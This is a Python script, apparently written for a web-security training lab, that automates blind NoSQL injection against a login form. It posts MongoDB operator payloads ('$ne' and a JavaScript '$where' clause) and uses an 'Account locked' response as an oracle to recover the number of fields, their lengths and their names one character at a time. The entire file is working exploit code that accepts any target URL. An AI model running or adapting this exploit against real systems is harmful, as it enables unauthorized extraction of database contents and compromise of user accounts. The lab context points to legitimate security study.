import multiprocessing
import requests
import typer
import rich

def find_nth_char_proc(input_data):
    col_idx, char_idx, to_check, headers, url, payload = input_data
    payload['$where'] = f"Object.keys(this)[{col_idx}].match(/^{'.' * char_idx}{to_check}/)"
    resp = requests.post(url, headers=headers, json=payload)
    if 'Account locked' in resp.text:
        return to_check
    return None

def find_num_fields(input_data):
    to_check, headers, url, payload = input_data
    payload['$where'] = f"Object.keys(this).length == {to_check}"
    resp = requests.post(url, headers=headers, json=payload)
    if 'Account locked' in resp.text:
        return to_check
    return None

def find_field_length(input_data):
    idx, to_check, headers, url, payload = input_data
    payload['$where'] = f"Object.keys(this)[{idx}].length == {to_check}"
    resp = requests.post(url, headers=headers, json=payload)
    if 'Account locked' in resp.text:
        return to_check
    return None

def collapse(data):
    for r in data:
        if r is not None:
            return r
    raise RuntimeError("Couldn't find valid return value...")

def main(base_url: str, session_cookie: str, pool_size: int = -1):
    #base_url = 'https://0a9500ba041cb22184c53150005800e8.web-security-academy.net'
    #session_cookie = '42bLN0ruWjxrBVB2ZfwYXRaXJupwIdCB'
    if pool_size < 0:
        pool_size = multiprocessing.cpu_count()
    console = rich.console.Console()
    url = base_url + '/login'

    http_headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': '*/*',
        'Accept-Language': 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer': url,
        'Origin': base_url,
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Cookie': f'session={session_cookie}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0'
    }
    base_payload = { "username": "carlos", "password": { "$ne": "" }, "$where": None }
    with console.status('Guessing the number of fields...'):
        proc_input_data = [ (i, http_headers, url, base_payload) for i in range(1, 20) ]
        with multiprocessing.Pool(pool_size) as p:
            results = p.map(find_num_fields, proc_input_data)
    
    num_fields = collapse(results)
    console.print(f'Found {num_fields} fields')
    
    possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789'

    while True:
        field_idx = int(input(f'Specify field index to guess (< 1 or > {num_fields} to exit): ')) - 1
        if field_idx < 0 or field_idx >= num_fields:
            break
        with console.status(f'Guessing {field_idx+1}° field length...'):
            proc_input_data = [ (field_idx, j, http_headers, url, base_payload) for j in range(20) ]
            with multiprocessing.Pool(pool_size) as p:
                results = p.map(find_field_length, proc_input_data)
            
            field_length = collapse(results)
        
        console.print(f'Found {field_idx+1}° field length: {field_length}, guessing it...')
        
        console.print("Guessing field name: ", end="")
        field_name = ""
        for j in range(field_length):
            proc_input_data = [ (field_idx, j, c, http_headers, url, base_payload) for c in possible_chars ]
            with multiprocessing.Pool(pool_size) as p:
                results = p.map(find_nth_char_proc, proc_input_data)
            
            char_found = collapse(results)
            console.print(char_found, end="", style="red")
            #console.print(f'Found char {char_found}')
            field_name += char_found

        console.print(f'\nFound field name: "{field_name}"')


if __name__ == '__main__':
    typer.run(main)